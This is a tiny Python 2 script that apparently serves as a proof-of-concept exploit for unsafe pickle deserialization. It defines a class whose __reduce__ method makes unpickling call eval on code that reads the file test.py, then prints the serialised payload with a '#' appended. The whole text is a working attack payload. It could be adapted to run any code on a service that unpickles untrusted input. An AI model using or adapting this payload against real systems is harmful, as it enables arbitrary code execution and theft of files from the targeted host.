import pickle
class payload(object):
    def __reduce__(self):
        return (eval, (('open("test.py").read()'),))
    
payload = pickle.dumps( payload())+"#"
print payload

